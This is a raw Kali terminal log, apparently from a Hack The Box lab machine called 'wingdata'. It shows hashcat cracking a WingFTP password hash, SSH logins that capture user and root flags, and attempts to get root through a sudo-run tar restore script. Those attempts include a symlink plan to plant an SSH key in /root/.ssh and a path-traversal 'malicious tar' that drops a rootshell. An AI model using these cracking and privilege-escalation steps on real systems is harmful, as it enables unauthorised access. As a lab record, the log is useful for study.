+└─$ hashcat -m 1410 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #01: cpu--0x000, 1466/2932 MB (512 MB allocatable), 10MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hash 'hashes.txt': Token length exception
+
+* Token length exception: 1/1 hashes
+  This error happens if the wrong hash type is specified, if the hashes are
+  malformed, or if input is otherwise not as expected (for example, if the
+  --username or --dynamic-x option is used but no username or dynamic-tag is present)
+
+No hashes loaded.
+
+Started: Thu Apr  2 20:51:11 2026
+Stopped: Thu Apr  2 20:51:11 2026
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat hash.txt                                                    
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
+a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba:WingFTP
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat -m 1410 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #01: cpu--0x000, 1466/2932 MB (512 MB allocatable), 10MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 2 digests; 2 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Iterated
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory allocated for this attack: 514 MB (992 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+Approaching final keyspace - workload adjusted.           
+
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+                                                          
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 1410 (sha256($pass.$salt))
+Hash.Target......: hash.txt
+Time.Started.....: Thu Apr  2 20:53:07 2026 (2 secs)
+Time.Estimated...: Thu Apr  2 20:53:09 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  5866.0 kH/s (0.56ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
+Progress.........: 14344384/14344384 (100.00%)
+Rejected.........: 0/14344384 (0.00%)
+Restore.Point....: 14344384/14344384 (100.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: #!goth -> $HEX[042a0337c2a156616d6f732103]
+
+Started: Thu Apr  2 20:52:56 2026
+Stopped: Thu Apr  2 20:53:10 2026
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat --show hash.txt                                       
+The following 15 hash-modes match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
+   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
+  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
+  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
+  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
+   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
+  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
+  20730 | sha256(sha256($pass.$salt))                                | Raw Hash salted and/or iterated
+   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
+  33300 | HMAC-BLAKE2S (key = $pass)                                 | Raw Hash authenticated
+   1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
+   1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
+  11750 | HMAC-Streebog-256 (key = $pass), big-endian                | Raw Hash authenticated
+  11760 | HMAC-Streebog-256 (key = $salt), big-endian                | Raw Hash authenticated
+  20712 | RSA Security Analytics / NetWitness (sha256)               | Enterprise Application Software (EAS)
+
+Please specify the hash-mode with -m [hash-mode].
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat -m 1410 --show hash.txt
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd ../.ssh            
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh]
+└─$ ls
+agent  known_hosts  known_hosts.old
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh]
+└─$ cd know
+cd: no such file or directory: know
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh]
+└─$ cd agent    
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh/agent]
+└─$ les
+Command 'les' not found, but can be installed with:
+sudo apt install atm-tools
+Do you want to install it? (N/y)ls^C
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh/agent]
+└─$ ls 
+s.RDJpj98jBr.agent.8uP1mm1999
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh/agent]
+└─$ 
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh/agent]
+└─$ sshkeygen             
+Command 'sshkeygen' not found, did you mean:
+  command 'ssh-keygen' from deb openssh-client
+Try: sudo apt install <deb name>
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh/agent]
+└─$ ssh-keygen
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_ed25519):   
+Enter passphrase for "/home/kali/.ssh/id_ed25519" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kali/.ssh/id_ed25519
+Your public key has been saved in /home/kali/.ssh/id_ed25519.pub
+The key fingerprint is:
+SHA256:4I70LuDgJr2EhAr4n9bu8/w72Z/Rs32x4cZRXp9WGKQ kali@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|             ..  |
+|             ..  |
+|      .     E  o |
+|o    . .      . +|
+|+.  . . S      .*|
+|=o.. +         Bo|
+|++o...o    o  =.*|
+|.+o.ooo.  o .  B=|
+|o .oo++oo.oo .+.o|
++----[SHA256]-----+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh/agent]
+└─$ ls
+s.RDJpj98jBr.agent.8uP1mm1999
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh/agent]
+└─$ cd ..     
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh]
+└─$ ls
+agent  id_ed25519  id_ed25519.pub  known_hosts  known_hosts.old
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh]
+└─$ cat id_ed25519.pub 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINVnnILoQmmzA0f1e2LUnKppwAJ+KLq77e1EUFQogQQE kali@kali
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/.ssh]
+└─$ ssh root@wingdata.htb                    
+root@wingdata.htb's password: 
+
+                                                                                                                          
+┌──(kali㉿kali)-[~/.ssh]
+└─$ ssh root@wingdata.htb -i id_ed25519 
+root@wingdata.htb's password: 
+
+                                                                                                                          
+┌──(kali㉿kali)-[~/.ssh]
+└─$ ssh root@wingdata.htb -i id_ed25519
+Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr 2 21:46:31 2026 from 10.10.14.233
+root@wingdata:~# cat root.txt
+c9726fa9666774e9ab8cbcb7fd4a2468
+root@wingdata:~# Read from remote host wingdata.htb: Connection timed out
+Connection to wingdata.htb closed.                                                                                                                                                                           
+client_loop: send disconnect: Broken pipe 
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh wacky@wingdata.htb
+wacky@wingdata.htb's password: 
+Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr 2 20:54:22 2026 from 10.10.14.233
+wacky@wingdata:~$ ls
+user.txt
+wacky@wingdata:~$ cat user.txt
+079b637fe586d82f045169f04ca5d606
+wacky@wingdata:~$ ss -plunt
+Netid             State              Recv-Q             Send-Q                         Local Address:Port                           Peer Address:Port             Process             
+udp               UNCONN             0                  0                                    0.0.0.0:68                                  0.0.0.0:*                                    
+tcp               LISTEN             0                  128                                  0.0.0.0:22                                  0.0.0.0:*                                    
+tcp               LISTEN             0                  511                                  0.0.0.0:80                                  0.0.0.0:*                                    
+tcp               LISTEN             0                  128                                  0.0.0.0:5466                                0.0.0.0:*                                    
+tcp               LISTEN             0                  128                                  0.0.0.0:42811                               0.0.0.0:*                                    
+tcp               LISTEN             0                  128                                127.0.0.1:8080                                0.0.0.0:*                                    
+tcp               LISTEN             0                  128                                     [::]:22                                     [::]:*                                    
+tcp               LISTEN             0                  128                                     [::]:5466                                   [::]:*                                    
+wacky@wingdata:~$ cd /opt/backup_clients/
+wacky@wingdata:/opt/backup_clients$ ls
+backups  restore_backup_clients.py  restored_backups
+wacky@wingdata:/opt/backup_clients$ cd backups/
+wacky@wingdata:/opt/backup_clients/backups$ ;s
+-bash: syntax error near unexpected token `;'
+wacky@wingdata:/opt/backup_clients/backups$ python3
+Python 3.12.3 (main, Nov  3 2025, 09:30:32) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> import subprocess
+>>> import tarfile
+>>> import tempfile
+>>> from pathlib import Path
+>>> BACKUP_BASE_DIR = Path("/opt/backup_clients/backups")
+>>> STAGING_DIR = Path("/opt/backup_clients/restored_backups")
+>>> BACKUP_NAME = "backup_1555.tar"
+>>> RESTORE_TAG = "restor_pwned"
+>>> RESTORE_DIR = STAGING_BASE / RESTORE_TAG
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'STAGING_BASE' is not defined. Did you mean: 'STAGING_DIR'?
+>>> RESTORE_DIR = STAGING_DIR / RESTORE_TAG
+>>> ATTACK_PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINVnnILoQmmzA0f1e2LUnKppwAJ+KLq77e1EUFQogQQE kali@kali"
+>>> BACKUP_BASE_DIR.mkdir(parents=True, exists_ok=True)
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+TypeError: Path.mkdir() got an unexpected keyword argument 'exists_ok'
+>>> BACKUP_BASE_DIR.mkdir(parents=True, exist_ok=True)
+>>> RESTORE_DIR.mkdir(parents=True, exist_ok=True)
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/local/lib/python3.12/pathlib.py", line 1311, in mkdir
+    os.mkdir(self, mode)
+PermissionError: [Errno 13] Permission denied: '/opt/backup_clients/restored_backups/restor_pwned'
+>>> def ensure_dirs():
+...     # Ensure we can write backup tar
+...     BACKUP_BASE_DIR.mkdir(parents=True, exist_ok=True)
+... 
+>>>     # Prepare restore dir and symlink .ssh -> /root/.ssh
+>>>     RESTORE_DIR.mkdir(parents=True, exist_ok=True)
+  File "<stdin>", line 1
+    RESTORE_DIR.mkdir(parents=True, exist_ok=True)
+IndentationError: unexpected indent
+>>> 
+>>>     ssh_symlink = RESTORE_DIR / ".ssh"
+  File "<stdin>", line 1
+    ssh_symlink = RESTORE_DIR / ".ssh"
+IndentationError: unexpected indent
+>>>     try:
+  File "<stdin>", line 1
+    try:
+IndentationError: unexpected indent
+>>>         # Remove if something already there
+>>>         if ssh_symlink.is_symlink() or ssh_symlink.exists():
+  File "<stdin>", line 1
+    if ssh_symlink.is_symlink() or ssh_symlink.exists():
+IndentationError: unexpected indent
+>>>             ssh_symlink.unlink()
+  File "<stdin>", line 1
+    ssh_symlink.unlink()
+IndentationError: unexpected indent
+>>>     except FileNotFoundError:
+  File "<stdin>", line 1
+    except FileNotFoundError:
+IndentationError: unexpected indent
+>>>         pass
+  File "<stdin>", line 1
+    pass
+IndentationError: unexpected indent
+>>> 
+>>>     # Create symlink pointing to /root/.ssh
+>>>     os.symlink("/root/.ssh", ssh_symlink)
+  File "<stdin>", line 1
+    os.symlink("/root/.ssh", ssh_symlink)
+IndentationError: unexpected indent
+>>> def ensure_dirs():
+...     # Ensure we can write backup tar
+...     BACKUP_BASE_DIR.mkdir(parents=True, exist_ok=True)
+... 
+>>>     # Prepare restore dir and symlink .ssh -> /root/.ssh
+>>>     RESTORE_DIR.mkdir(parents=True, exist_ok=True)
+  File "<stdin>", line 1
+    RESTORE_DIR.mkdir(parents=True, exist_ok=True)
+IndentationError: unexpected indent
+>>> 
+>>>     ssh_symlink = RESTORE_DIR / ".ssh"
+  File "<stdin>", line 1
+    ssh_symlink = RESTORE_DIR / ".ssh"
+IndentationError: unexpected indent
+>>>     try:
+  File "<stdin>", line 1
+    try:
+IndentationError: unexpected indent
+>>>         # Remove if something already there
+>>>         if ssh_symlink.is_symlink() or ssh_symlink.exists():
+  File "<stdin>", line 1
+    if ssh_symlink.is_symlink() or ssh_symlink.exists():
+IndentationError: unexpected indent
+>>>             ssh_symlink.unlink()
+  File "<stdin>", line 1
+    ssh_symlink.unlink()
+IndentationError: unexpected indent
+>>>     except FileNotFoundError:
+  File "<stdin>", line 1
+    except FileNotFoundError:
+IndentationError: unexpected indent
+>>>         pass
+  File "<stdin>", line 1
+    pass
+IndentationError: unexpected indent
+>>> 
+>>>     # Create symlink pointing to /root/.ssh
+>>>     os.symlink("/root/.ssh", ssh_symlink)
+  File "<stdin>", line 1
+    os.symlink("/root/.ssh", ssh_symlink)
+IndentationError: unexpected indent
+>>> exit()
+wacky@wingdata:/opt/backup_clients/backups$ nano backup.py
+wacky@wingdata:/opt/backup_clients/backups$ python backup.py 
+-bash: python: command not found
+wacky@wingdata:/opt/backup_clients/backups$ python3 backup.py 
+[*] Setting up directories and symlink...
+Traceback (most recent call last):
+  File "/opt/backup_clients/backups/backup.py", line 82, in <module>
+    main()
+  File "/opt/backup_clients/backups/backup.py", line 69, in main
+    ensure_dirs()
+  File "/opt/backup_clients/backups/backup.py", line 25, in ensure_dirs
+    RESTORE_DIR.mkdir(parents=True, exist_ok=True)
+  File "/usr/local/lib/python3.12/pathlib.py", line 1311, in mkdir
+    os.mkdir(self, mode)
+PermissionError: [Errno 13] Permission denied: '/opt/backup_clients/restored_backups/restore_pwned'
+wacky@wingdata:/opt/backup_clients/backups$ cd ..
+wacky@wingdata:/opt/backup_clients$ ls -la
+total 20
+drwxr-x--- 4 root wacky 4096 Jan 12 08:43 .
+drwxr-xr-x 4 root root  4096 Feb  9 08:19 ..
+drwxrwx--- 2 root wacky 4096 Apr  2 21:11 backups
+-rwxr-x--- 1 root wacky 2829 Jan 12 08:37 restore_backup_clients.py
+drwxr-x--- 2 root wacky 4096 Jan 12 08:43 restored_backups
+wacky@wingdata:/opt/backup_clients$ sudo -l
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+wacky@wingdata:/opt/backup_clients$ Read from remote host wingdata.htb: Connection timed out
+Connection to wingdata.htb closed.
+client_loop: send disconnect: Broken pipe
+                                                                                   
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh wacky@wingdata.htb -L 9000:localhost:5466
+wacky@wingdata.htb's password: 
+Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr 2 20:59:36 2026 from 10.10.14.233
+wacky@wingdata:~$ ls
+user.txt
+wacky@wingdata:~$ cd /opt
+wacky@wingdata:/opt$ ls
+backup_clients  wftpserver
+wacky@wingdata:/opt$ sudo -l
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+wacky@wingdata:/opt$ cat /opt/backup_clients/restore_backup_clients.py 
+#!/usr/bin/env python3
+import tarfile
+import os
+import sys
+import re
+import argparse
+
+BACKUP_BASE_DIR = "/opt/backup_clients/backups"
+STAGING_BASE = "/opt/backup_clients/restored_backups"
+
+def validate_backup_name(filename):
+    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
+        return False
+    client_id = filename.split('_')[1].rstrip('.tar')
+    return client_id.isdigit() and client_id != "0"
+
+def validate_restore_tag(tag):
+    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Restore client configuration from a validated backup tarball.",
+        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
+    )
+    parser.add_argument(
+        "-b", "--backup",
+        required=True,
+        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
+             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
+    )
+    parser.add_argument(
+        "-r", "--restore-dir",
+        required=True,
+        help="Staging directory name for the restore operation. "
+             "Must follow the format: restore_<client_user> (e.g., restore_john). "
+             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
+    )
+
+    args = parser.parse_args()
+
+    if not validate_backup_name(args.backup):
+        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
+        sys.exit(1)
+
+    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
+    if not os.path.isfile(backup_path):
+        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
+        sys.exit(1)
+
+    if not args.restore_dir.startswith("restore_"):
+        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
+        sys.exit(1)
+
+    tag = args.restore_dir[8:]
+    if not tag:
+        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
+        sys.exit(1)
+
+    if not validate_restore_tag(tag):
+        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
+        sys.exit(1)
+
+    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
+    print(f"[+] Backup: {args.backup}")
+    print(f"[+] Staging directory: {staging_dir}")
+
+    os.makedirs(staging_dir, exist_ok=True)
+
+    try:
+        with tarfile.open(backup_path, "r") as tar:
+            tar.extractall(path=staging_dir, filter="data")
+        print(f"[+] Extraction completed in {staging_dir}")
+    except (tarfile.TarError, OSError, Exception) as e:
+        print(f"[!] Error during extraction: {e}", file=sys.stderr)
+        sys.exit(2)
+
+if __name__ == "__main__":
+    main()
+wacky@wingdata:/opt$ ls -la backup_clients/
+total 20
+drwxr-x--- 4 root wacky 4096 Jan 12 08:43 .
+drwxr-xr-x 4 root root  4096 Feb  9 08:19 ..
+drwxrwx--- 2 root wacky 4096 Apr  2 21:11 backups
+-rwxr-x--- 1 root wacky 2829 Jan 12 08:37 restore_backup_clients.py
+drwxr-x--- 2 root wacky 4096 Jan 12 08:43 restored_backups
+wacky@wingdata:/opt$ nano check.py
+wacky@wingdata:/opt$ cd backup_clients/
+wacky@wingdata:/opt/backup_clients$ cd backups/
+wacky@wingdata:/opt/backup_clients/backups$ ls
+backup.py
+wacky@wingdata:/opt/backup_clients/backups$ nano check.py
+wacky@wingdata:/opt/backup_clients/backups$ python3 check.py 
+[*] Checking sudo -l for restore_backup_clients.py ...
+[+] Found expected sudo rule for restore_backup_clients.py
+[*] Checking script path and contents ...
+[+] Script uses tarfile.open(..., 'r') and extractall(...)
+[*] Creating simple traversal test tar at /opt/backup_clients/backups/backup_9999.tar ...
+Traceback (most recent call last):
+  File "/opt/backup_clients/backups/check.py", line 125, in <module>
+    main()
+  File "/opt/backup_clients/backups/check.py", line 120, in main
+    make_simple_traversal_tar()
+  File "/opt/backup_clients/backups/check.py", line 74, in make_simple_traversal_tar
+    tar.addfile(info, fileobj=io.BytesIO(data))
+                              ^^
+NameError: name 'io' is not defined. Did you mean: 'id'? Or did you forget to import 'io'?
+wacky@wingdata:/opt/backup_clients/backups$ nano check.py
+wacky@wingdata:/opt/backup_clients/backups$ python3 check.py 
+[*] Checking sudo -l for restore_backup_clients.py ...
+[+] Found expected sudo rule for restore_backup_clients.py
+[*] Checking script path and contents ...
+[+] Script uses tarfile.open(..., 'r') and extractall(...)
+[*] Creating simple traversal test tar at /opt/backup_clients/backups/backup_9999.tar ...
+[+] Created basic traversal tar
+[*] Cleaning old test target if any ...
+[*] Running restore_backup_clients.py via sudo ...
+[*] Script output:
+[+] Backup: backup_9999.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_wacky_test
+
+[*] Checking for escaped file: /tmp/restore_test.txt
+[+] /tmp/restore_test.txt does NOT exist.
+    Simple traversal payload was blocked by tarfile filter.
+    Any real exploit would need a more advanced technique (e.g.
+    PATH_MAX/symlink-chain bug as described in recent tarfile advisories).
+wacky@wingdata:/opt/backup_clients/backups$ rm backup.py
+wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
+wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py 
+[+] Creating malicious tar: backup_1001.tar
+Traceback (most recent call last):
+  File "/opt/backup_clients/backups/exploit.py", line 62, in <module>
+    main()
+  File "/opt/backup_clients/backups/exploit.py", line 48, in main
+    tar.addfile(info, fileobj=os.BytesIO(PAYLOAD))
+                              ^^^^^^^^^^
+AttributeError: module 'os' has no attribute 'BytesIO'
+wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
+wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py 
+[+] Creating malicious tar: backup_1001.tar
+[+] Created backup_1001.tar with member name: ../../../../../../tmp/rootshell
+[*] Next steps (on the target box, as wacky):
+    1) Copy the tar into /opt/backup_clients/backups/:
+       cp backup_1001.tar /opt/backup_clients/backups/
+    2) Run the vulnerable restore script as root:
+       sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+    3) If it worked, on the box you should see /tmp/rootshell as root-owned.
+       Then run: /tmp/rootshell
+       and you should get a root shell (bash -p).
+wacky@wingdata:/opt/backup_clients/backups$ ls
+backup_1001.tar  backup_9999.tar  check.py  exploit.py
+wacky@wingdata:/opt/backup_clients/backups$ sudo python3 ../restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+[sudo] password for wacky: 
+sudo: a password is required
+wacky@wingdata:/opt/backup_clients/backups$ sudo -u root python3 ../restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+[sudo] password for wacky: 
+sudo: a password is required
+wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 ../restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+[sudo] password for wacky: 
+sudo: a password is required
+wacky@wingdata:/opt/backup_clients/backups$ sudo -l
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+[+] Backup: backup_1001.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
+[!] Error during extraction: '../../../../../../tmp/rootshell' would be extracted to '/tmp/rootshell', which is outside the destination
+wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
+wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py 
+[+] Creating malicious tar: backup_1001.tar
+[+] Created backup_1001.tar with member name: ../../../../../../../../../../../../../../../../../../tmp/rootshell
+[*] Next steps (on the target box, as wacky):
+    1) Copy the tar into /opt/backup_clients/backups/:
+       cp backup_1001.tar /opt/backup_clients/backups/
+    2) Run the vulnerable restore script as root:
+       sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+    3) If it worked, on the box you should see /tmp/rootshell as root-owned.
+       Then run: /tmp/rootshell
+       and you should get a root shell (bash -p).
+wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+[+] Backup: backup_1001.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
+[!] Error during extraction: '../../../../../../../../../../../../../../../../../../tmp/rootshell' would be extracted to '/tmp/rootshell', which is outside the destination
+wacky@wingdata:/opt/backup_clients/backups$ python3 -v
+import _frozen_importlib # frozen
+import _imp # builtin
+import '_thread' # <class '_frozen_importlib.BuiltinImporter'>
+import '_warnings' # <class '_frozen_importlib.BuiltinImporter'>
+import '_weakref' # <class '_frozen_importlib.BuiltinImporter'>
+import '_io' # <class '_frozen_importlib.BuiltinImporter'>
+import 'marshal' # <class '_frozen_importlib.BuiltinImporter'>
+import 'posix' # <class '_frozen_importlib.BuiltinImporter'>
+import '_frozen_importlib_external' # <class '_frozen_importlib.FrozenImporter'>
+# installing zipimport hook
+import 'time' # <class '_frozen_importlib.BuiltinImporter'>
+import 'zipimport' # <class '_frozen_importlib.FrozenImporter'>
+# installed zipimport hook
+# /usr/local/lib/python3.12/encodings/__pycache__/__init__.cpython-312.pyc matches /usr/local/lib/python3.12/encodings/__init__.py
+# code object from '/usr/local/lib/python3.12/encodings/__pycache__/__init__.cpython-312.pyc'
+import '_codecs' # <class '_frozen_importlib.BuiltinImporter'>
+import 'codecs' # <class '_frozen_importlib.FrozenImporter'>
+# /usr/local/lib/python3.12/encodings/__pycache__/aliases.cpython-312.pyc matches /usr/local/lib/python3.12/encodings/aliases.py
+# code object from '/usr/local/lib/python3.12/encodings/__pycache__/aliases.cpython-312.pyc'
+import 'encodings.aliases' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fc0944a0>
+import 'encodings' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fc05faa0>
+# /usr/local/lib/python3.12/encodings/__pycache__/utf_8.cpython-312.pyc matches /usr/local/lib/python3.12/encodings/utf_8.py
+# code object from '/usr/local/lib/python3.12/encodings/__pycache__/utf_8.cpython-312.pyc'
+import 'encodings.utf_8' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fc096a20>
+import '_signal' # <class '_frozen_importlib.BuiltinImporter'>
+import '_abc' # <class '_frozen_importlib.BuiltinImporter'>
+import 'abc' # <class '_frozen_importlib.FrozenImporter'>
+import 'io' # <class '_frozen_importlib.FrozenImporter'>
+import '_stat' # <class '_frozen_importlib.BuiltinImporter'>
+import 'stat' # <class '_frozen_importlib.FrozenImporter'>
+import '_collections_abc' # <class '_frozen_importlib.FrozenImporter'>
+import 'genericpath' # <class '_frozen_importlib.FrozenImporter'>
+import 'posixpath' # <class '_frozen_importlib.FrozenImporter'>
+import 'os' # <class '_frozen_importlib.FrozenImporter'>
+import '_sitebuiltins' # <class '_frozen_importlib.FrozenImporter'>
+Processing user site-packages
+Processing global site-packages
+Adding directory: '/usr/local/lib/python3.12/site-packages'
+import 'site' # <class '_frozen_importlib.FrozenImporter'>
+# extension module 'readline' loaded from '/usr/local/lib/python3.12/lib-dynload/readline.cpython-312-x86_64-linux-gnu.so'
+# extension module 'readline' executed from '/usr/local/lib/python3.12/lib-dynload/readline.cpython-312-x86_64-linux-gnu.so'
+import 'readline' # <_frozen_importlib_external.ExtensionFileLoader object at 0x7f77fbb010d0>
